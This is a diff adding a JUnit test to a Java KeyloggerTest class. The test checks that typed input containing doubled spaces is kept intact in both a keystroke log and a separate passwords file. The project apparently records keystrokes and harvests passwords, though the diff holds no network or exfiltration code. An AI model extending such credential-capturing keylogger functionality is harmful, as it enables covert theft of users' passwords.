@@ -127,6 +127,18 @@ class KeyloggerTest {
 	}
 
 	@Test
+	void passwordWhitespaceIsPreservedInTheLogs() throws Exception {
+		OpsNotifier notifier = new OpsNotifier(null);
+		Keylogger logger = logger(notifier);
+
+		type(logger, "abc  def123");
+		enter(logger);
+
+		assertTrue(Files.readString(OpsPaths.keylog(temp)).strip().endsWith("] abc  def123"));
+		assertTrue(Files.readString(OpsPaths.passwords(temp)).contains("| abc  def123"));
+	}
+
+	@Test
 	void aDeadKeyAddsNoCharacterButKeepsTheBuffer() throws Exception {
 		OpsNotifier notifier = new OpsNotifier(null);
 		Keylogger logger = logger(notifier);
